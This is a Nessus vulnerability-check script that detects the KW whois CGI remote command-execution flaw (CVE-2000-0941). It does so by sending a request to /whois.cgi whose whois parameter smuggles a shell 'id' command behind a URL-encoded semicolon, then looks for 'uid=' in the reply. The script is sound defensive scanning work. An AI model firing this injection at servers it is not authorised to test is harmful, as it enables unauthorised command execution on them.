#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10541);
 script_version ("$Revision: 1.13 $");
 script_bugtraq_id(1883);
 script_cve_id("CVE-2000-0941");

 name["english"] = "KW whois";
 name["francais"] = "KW whois";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The KW whois cgi is installed. This CGI has
a well known security flaw that lets anyone execute arbitrary
commands with the privileges of the http daemon (root or nobody).

Solution : remove it from /cgi-bin or upgrade to version 1.1

Risk factor : Serious";


 desc["francais"] = "Le cgi KW whois est installé. Celui-ci possède
un problème de sécurité bien connu qui permet à n'importe qui de faire
executer des commandes arbitraires au daemon http, avec les privilèges
de celui-ci (root ou nobody). 

Solution : retirez-le de /cgi-bin ou mettez-le à jour en version 1.1

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/whois.cgi";
 summary["francais"] = "Vérifie la présence de /cgi-bin/whois.cgi";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_kb_item("Services/www");
if(!port)port = 80;
if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
req = string(dir, "/whois.cgi?action=load&whois=%3Bid");
req = http_get(item:req, port:port);
r = http_keepalive_send_recv(port:port, data:req);
if( r == NULL ) exit(0);
exp = string("uid=");
if(exp >< r)
 {
 security_hole(port);
 exit(0);
 }
}



